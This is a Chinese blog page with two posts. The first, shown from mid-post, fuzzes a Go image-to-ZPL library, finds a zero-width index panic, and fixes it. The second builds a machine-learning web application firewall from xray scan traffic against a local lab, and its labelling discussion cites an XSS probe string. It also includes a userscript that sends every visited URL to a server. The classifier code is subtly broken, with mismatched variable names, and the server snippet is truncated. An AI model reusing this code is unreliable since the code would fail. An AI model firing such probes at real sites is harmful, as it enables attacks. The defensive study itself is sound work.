220-byte failing input file</span><br><span class="line">fuzz: elapsed: 2s, gathering baseline coverage: 434/1541 completed</span><br><span class="line">--- FAIL: FuzzReverse (1.93s)</span><br><span class="line">    --- FAIL: FuzzReverse (0.00s)</span><br><span class="line">        testing.go:1485: panic: runtime error: index out of range [0] with length 0</span><br><span class="line">            goroutine 1254 [running]:</span><br><span class="line">            runtime/debug.Stack()</span><br><span class="line">                /usr/local/go/src/runtime/debug/stack.go:24 +0xbc</span><br><span class="line">            testing.tRunner.func1()</span><br><span class="line">                /usr/local/go/src/testing/testing.go:1485 +0x264</span><br><span class="line">            panic(&#123;0x102b9e940, 0x14000016318&#125;)</span><br><span class="line">                /usr/local/go/src/runtime/panic.go:884 +0x204</span><br><span class="line">            simonwaldherr.de/go/zplgfa.ConvertToGraphicField(&#123;0x102bb0de8, 0x140000a8a00&#125;, 0x2)</span><br><span class="line">                /Users/*/go/pkg/mod/simonwaldherr.de/go/zplgfa@v1.1.1/zplgfa.go:160 +0xb44</span><br><span class="line">            simonwaldherr.de/go/zplgfa.ConvertToZPL(&#123;0x102bb0de8?, 0x140000a8a00?&#125;, 0x140000d9748?)</span><br><span class="line">                /Users/*/go/pkg/mod/simonwaldherr.de/go/zplgfa@v1.1.1/zplgfa.go:31 +0x50</span><br><span class="line">            test.FuzzReverse.func1(0x140000d9718?, &#123;0x14000026700, 0x1f, 0x80&#125;)</span><br><span class="line">                /Users/*/Desktop/src/cve/m_test.go:27 +0x130</span><br><span class="line">            reflect.Value.call(&#123;0x102b7c560?, 0x102baeca0?, 0x14000544e38?&#125;, &#123;0x102b27556, 0x4&#125;, &#123;0x1400009b8f0, 0x2, 0x0?&#125;)</span><br><span class="line">                /usr/local/go/src/reflect/value.go:586 +0x87c</span><br><span class="line">            reflect.Value.Call(&#123;0x102b7c560?, 0x102baeca0?, 0x0?&#125;, &#123;0x1400009b8f0?, 0x102bade20?, 0x102c781f8?&#125;)</span><br><span class="line">                /usr/local/go/src/reflect/value.go:370 +0x90</span><br><span class="line">            testing.(*F).Fuzz.func1.1(0x0?)</span><br><span class="line">                /usr/local/go/src/testing/fuzz.go:335 +0x360</span><br><span class="line">            testing.tRunner(0x1400010b040, 0x1400007ad80)</span><br><span class="line">                /usr/local/go/src/testing/testing.go:1576 +0x10c</span><br><span class="line">            created by testing.(*F).Fuzz.func1</span><br><span class="line">                /usr/local/go/src/testing/fuzz.go:322 +0x4c4</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">    Failing input written to testdata/fuzz/FuzzReverse/3e80f54c43de28a6</span><br><span class="line">    To re-run:</span><br><span class="line">    go test -run=FuzzReverse/3e80f54c43de28a6</span><br><span class="line">FAIL</span><br><span class="line">exit status 1</span><br><span class="line">FAIL    test    2.559s</span><br></pre></td></tr></table></figure>

<p>进代码里看看：发现在 <code>ConvertToGraphicField</code> 函数中，使用 <code>image</code> 库的 <code>Bounds().Size()</code> 获取了图片的长宽信息，但是事实上，这里是可以伪造的</p>
<p><img src="https://p.ipic.vip/wka043.jpg"></p>
<p>可以看到这里的宽度就是0，之后顺着代码往下读，发现在下边的for循环中，line是根据宽度make出来的数组，而之后求currentByte时候更是直接求了索引为0的byte，这显然是个索引越界</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func ConvertToGraphicField(source image.Image, graphicType GraphicType) string &#123;</span><br><span class="line">    var gfType string</span><br><span class="line">    var lastLine string</span><br><span class="line">    size := source.Bounds().Size()</span><br><span class="line">    width := size.X / 8</span><br><span class="line">    height := size.Y</span><br><span class="line">    if size.Y%8 != 0 &#123;</span><br><span class="line">        width = width + 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    var GraphicFieldData string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for y := 0; y &lt; size.Y; y++ &#123;</span><br><span class="line">        line := make([]uint8, width)</span><br><span class="line">        lineIndex := 0</span><br><span class="line">        index := uint8(0)</span><br><span class="line">        currentByte := line[lineIndex]//line[0]！</span><br></pre></td></tr></table></figure>

<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>我的修复思路就是越早处理越好，顺着调用链找，看看哪里返回是最合适的：其实这里就可以直接返回了（我认为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func ConvertToZPL(img image.Image, graphicType GraphicType) string &#123;</span><br><span class="line">    wid := img.Bounds().Size().X / 8</span><br><span class="line">    if wid == 0 &#123;</span><br><span class="line">        return &quot;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    return fmt.Sprintf(&quot;^XA,^FS\n^FO0,0\n%s^FS,^XZ\n&quot;, ConvertToGraphicField(img, graphicType))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为宽度为零的话事实上已经可以直接把空字符串返回了，之所以没有返回一个 err 是因为这个师傅写的代码，整体都没用到 err，变参数对整体影响太大了，而且返回<code>&quot;&quot;</code>也是合理的，因为图片本身宽度就是 0，0 确实可以代表没有图片信息。</p>
<p>师傅果断进行了合并：</p>
<p><img src="https://p.ipic.vip/3w04ye.jpg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/31/2023-06-18-fixandPR/" data-id="cuidhUtq1YZ6IKixoBt0xb0Ef" data-title="记一次 fuzz go 的一个第三方库" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2023-05-23-waf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/23/2023-05-23-waf/" class="article-date">
  <time class="dt-published" datetime="2023-05-22T16:00:00.000Z" itemprop="datePublished">2023-05-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="整体效果和架构图"><a href="#整体效果和架构图" class="headerlink" title="整体效果和架构图"></a>整体效果和架构图</h2><blockquote>
<p>0.1版本</p>
</blockquote>
<p>最近想写一个基于 AI 的一个安全攻防项目，想了几个备选的想法，把重点放在了写一个 waf 上，0.1 版本算是完成了</p>
<p>url 不对劲直接就<code>forbidden</code>，否则<code>hello,{your_url}!</code></p>
<p>整体架构就是可以起一个 go 服务，go 服务器收到用户发来的 url 后就去找识别 url 的服务器，识别 url 服务器的能够根据训练出来的模型来把 url 自动识别是否为恶意请求，go 服务器得到回应之后可以进行一系列操作，没问题的话就放行，否则就向攻击者发送警告，封禁 ip 或者直接把 session 等销毁掉。这就根据具体业务来定了，这个 demo 实现的很简单，就是个<code>hello world</code>，把重点放在了 waf 上。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35161391/1684835442651-b93bce03-2402-4e60-ae2e-6c0722ebfb9e.png#averageHue=%23dfdfdf&clientId=ud8ebea9a-8990-4&from=paste&height=427&id=u82269c97&originHeight=427&originWidth=501&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36044&status=done&style=none&taskId=u15ac0502-f9c8-4249-834a-5c555987e5d&title=&width=501" alt="image.png"></p>
<p>本文从三个方面来介绍：</p>
<ul>
<li>数据集生成并处理</li>
<li>神经网络训练过程</li>
<li>两个服务器的交互</li>
</ul>
<h2 id="数据集生成并处理"><a href="#数据集生成并处理" class="headerlink" title="数据集生成并处理"></a>数据集生成并处理</h2><p>数据集可以从网上找，找到适合自己网络结构的。</p>
<p>还有一种就是自己定制化生成，对于企业来说，就是比如自己企业的测试部门在网页上线之前对网页进行的渗透行为可以把这块流量全部记录下来，或者红蓝对抗、HW的时候要及时复盘流量，自己复现下，按需打一打标签，更新自己的数据集。比如任何对网站不构成实质性威胁的行为统一打成0，即良性url上。而恶意的url就可以酌情定义了，比如url打过去出现信息泄漏，或者rce这种很严重的都可以打上1，sql注入尝试什么都统统打上1，<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>这种也是，但凡是正则能识别出来的通通打1！</p>
<h3 id="badrequest数据集生成"><a href="#badrequest数据集生成" class="headerlink" title="badrequest数据集生成"></a>badrequest数据集生成</h3><p>用的xray。靶机用了docker起了个pikachu（因为自己这个helloworld小demo实在没什么可打的，233）。之后把本机的lo0网卡信息全部捕捉下来了，通通标成1就行了。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;bytes&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//网卡信息lo0，可以按需修改</span></span><br><span class="line">    handle, err := pcap.OpenLive(<span class="string">&quot;lo0&quot;</span>, <span class="number">65536</span>, <span class="literal">true</span>, pcap.BlockForever)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> handle.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcp协议，端口是8000，而且只抓get请求（按需修改按需修改</span></span><br><span class="line">    filter := <span class="string">&quot;tcp and port 8000 and tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420&quot;</span></span><br><span class="line">    <span class="keyword">if</span> err := handle.SetBPFFilter(filter); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个文件用于存储URL信息</span></span><br><span class="line">    file, err := os.Create(<span class="string">&quot;url_info.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始捕获数据包</span></span><br><span class="line">    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())</span><br><span class="line">    <span class="keyword">for</span> packet := <span class="keyword">range</span> packetSource.Packets() &#123;</span><br><span class="line">        <span class="comment">// 解析数据包</span></span><br><span class="line">        <span class="keyword">if</span> applicationLayer := packet.ApplicationLayer(); applicationLayer != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="comment">// 提取HTTP请求中的URL信息</span></span><br><span class="line">            <span class="keyword">if</span> request, err := http.ReadRequest(bufio.NewReader(bytes.NewBuffer(applicationLayer.Payload()))); err == <span class="literal">nil</span> &#123;</span><br><span class="line">                url := request.URL.String()</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将URL信息写入文件</span></span><br><span class="line">                <span class="keyword">if</span> _, err := file.WriteString(url + <span class="string">&quot;\n&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    log.Println(err)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fmt.Println(url)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后把抓包程序跑起来，把pikachu也开开</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name piakchu -d -p 8000:80 area39/pikachu </span><br></pre></td></tr></table></figure>

<p>之后用xray的爬虫功能就行了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_arm64 webscan --basic-crawler http://127.0.0.1:8000/ --html-output xx.html</span><br></pre></td></tr></table></figure>

<p>可以看到能够得到不错的数据，左侧是恶意url数据集</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35161391/1684836337809-a726d35b-cdcd-4b2d-84d6-e3a9da3b2343.png#averageHue=%23efefef&clientId=ud8ebea9a-8990-4&from=paste&height=1440&id=udc2c3d80&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1213127&status=done&style=none&taskId=uaa33f40a-947f-4978-a4ab-0a739b41e61&title=&width=2560" alt="image.png"></p>
<h3 id="良好数据集生成"><a href="#良好数据集生成" class="headerlink" title="良好数据集生成"></a>良好数据集生成</h3><p>这块用了两种生成方式，一种就是模拟点击的方式，将所有url按照迭代的方式一代一代的点击一遍，对于本项目，pikachu而言能够点击的url着实不多</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests_html <span class="keyword">import</span> HTMLSession</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_links_to_file</span>(<span class="params">links</span>):</span><br><span class="line">    <span class="comment"># 追加链接到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;urls.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            f.write(link + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crawl</span>(<span class="params">url, end_time</span>):</span><br><span class="line">    <span class="comment"># 创建HTMLSession对象，获取网页内容</span></span><br><span class="line">    session = HTMLSession()</span><br><span class="line">    r = session.get(url)</span><br><span class="line">    <span class="comment"># 获取所有链接</span></span><br><span class="line">    links = r.html.absolute_links</span><br><span class="line">    urls = []</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        <span class="comment"># 如果链接是以http或https开头，则保存链接</span></span><br><span class="line">        <span class="keyword">if</span> link.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            urls.append(link)</span><br><span class="line">    <span class="comment"># 保存链接到文件</span></span><br><span class="line">    save_links_to_file(urls)</span><br><span class="line">    <span class="comment"># 递归访问所有链接</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        <span class="comment"># 如果当前时间已经超过了指定时间，则停止递归</span></span><br><span class="line">        <span class="keyword">if</span> time.time() &gt; end_time:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        crawl(url, end_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置爬取的起始URL和结束时间</span></span><br><span class="line">start_url = <span class="string">&#x27;http://127.0.0.1:8000/&#x27;</span></span><br><span class="line">end_time = time.time() + <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数，从指定URL开始递归访问所有链接，并追加到文件</span></span><br><span class="line">crawl(start_url, end_time)</span><br></pre></td></tr></table></figure>

<p>最后得到了使用<code>sort -u urls.txt</code>看下有多少。发现只有62行有效数据，这和我们使用xray得到的恶意数据集完全不是一个量级（恶意数据集有1万条url</p>
<p>我想了个别的方式（关于如何获取好的url，以构建自己的良性数据集），实现方式是写了个油猴插件，每次生成数据的人打开一个url的时候插件把url发送给服务器上，服务器端保存所有用户的数据（当然这是访问别的网站时候的数据，但只要数据具有多样性，重点是网络能不能学到恶意url而不是局限于具体的网站架构）。具体插件架构如图：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35161391/1684839291961-53b3e29e-d096-4634-a1c8-631d1dc9dfe0.png#averageHue=%23f1efed&clientId=ud8ebea9a-8990-4&from=paste&height=531&id=uf7c82c92&originHeight=531&originWidth=628&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41879&status=done&style=none&taskId=udb34938a-e709-4698-8973-1e60eadd99a&title=&width=628" alt="image.png"></p>
<p>油猴和服务器端代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Append URL to Local File</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey</span></span><br><span class="line"><span class="comment">// @version      1.0</span></span><br><span class="line"><span class="comment">// @description  Append current URL to local file on page load</span></span><br><span class="line"><span class="comment">// @match        *://*/*</span></span><br><span class="line"><span class="comment">// @grant        GM_xmlhttpRequest</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取当前页面的URL</span></span><br><span class="line">  <span class="keyword">const</span> currentUrl = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 发送 HTTP 请求将 URL 发送到服务器</span></span><br><span class="line">  <span class="title function_">GM_xmlhttpRequest</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;http://***:7000&#x27;</span>,<span class="comment">//改成自己的，我用的阿里云，好用，上云就上阿里云！</span></span><br><span class="line">    <span class="attr">data</span>: currentUrl,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onload</span>: <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;URL sent to server&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onerror</span>: <span class="keyword">function</span>(<span class="params">error</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error sending URL to server:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>服务器端，用的 nodejs 接收</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> body = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">chunk</span> =&gt;</span> &#123;</span><br><span class="line">      body += chunk.<span class="title function_">toString</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      fs.<span class="title function_">appendFile</span>(<span class="string">&#x27;urls.txt&#x27;</span>, body + <span class="string">&#x27;\n&#x27;</span>, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error appending URL to file:&#x27;</span>, err);</span><br><span class="line">          res.<span class="property">statusCode</span> = <span class="number">500</span>;</span><br><span class="line">          res.<span class="title function_">end</span>(<span class="string">&#x27;Error appending URL to file&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;URL appended to file:&#x27;</span>, body);</span><br><span class="line">          res.<span class="property">statusCode</span> = <span class="number">200</span>;</span><br><span class="line">          res.<span class="title function_">end</span>(<span class="string">&#x27;URL appended to file&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="property">statusCode</span> = <span class="number">404</span>;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Not found&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">7000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running on port 7000&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>我这块监听了一下午自己访问的网站，其实数据量也是相当小的</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35161391/1684839622322-19bb9d4f-c95e-4c2e-9ca3-c7b216fee00d.png#averageHue=%231c202c&clientId=ud8ebea9a-8990-4&from=paste&height=108&id=u3cd1df02&originHeight=108&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41297&status=done&style=none&taskId=ub20290c4-499c-4e01-9172-ae1a59d2f77&title=&width=911" alt="image.png"></p>
<p>处理的话简单，去重和审核一遍就行了，只要你没对浏览过的网站进行渗透啥的基本都没问题。最后用的数据是自己爬了点别的网站（尽管sklearn可以处理样本不均衡这个问题，但数据起码得足够多样），才凑够了量级</p>
<h2 id="神经网络训练过程"><a href="#神经网络训练过程" class="headerlink" title="神经网络训练过程"></a>神经网络训练过程</h2><p>训练选择了sklearn里的TfidfVectorizer，通过其将url数据转化为向量形式方便计算，之后一个简单的逻辑回归</p>
<p>因为重点是 ai 的使用而不是 ai 的原理，所以就一笔带过了，大家注释看不太懂或者任何想法直接留言就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> TfidfVectorizer</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">name</span>):</span><br><span class="line">    filepath = os.path.join(<span class="built_in">str</span>(os.getcwd()), name)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        alldata = f.readlines()</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alldata:</span><br><span class="line">        i = <span class="built_in">str</span>(urllib.parse.unquote(i))</span><br><span class="line">        ans.append(i)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">badqueries = load(<span class="string">&#x27;badqueries.txt&#x27;</span>)<span class="comment">#dao ru数据集</span></span><br><span class="line">goodqueries = load(<span class="string">&#x27;goodqueries.txt&#x27;</span>)<span class="comment">#导入两类url</span></span><br><span class="line">Y = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(badQueries))]+[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(validQueries))]<span class="comment">#给标签</span></span><br><span class="line">vectorizer = TfidfVectorizer()<span class="comment">#用来将url向量化</span></span><br><span class="line">X = vectorizer.fit_transform(badqueries+goodqueries)<span class="comment">#直接输进去</span></span><br><span class="line">X_train, X_test, Y_train, Y_test = train_test_split(X, Y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)<span class="comment">#分割训练数据和测试数据</span></span><br><span class="line">lgs = LogisticRegression(class_weight=<span class="string">&#x27;balanced&#x27;</span>) <span class="comment">#简单的逻辑回归二分类</span></span><br><span class="line">lgs.fit(X_train, y_train)<span class="comment">#begin！</span></span><br><span class="line"><span class="built_in">print</span>(lgs.score(X_test, y_test))</span><br><span class="line"><span class="comment">#0.9941273293313274</span></span><br></pre></td></tr></table></figure>

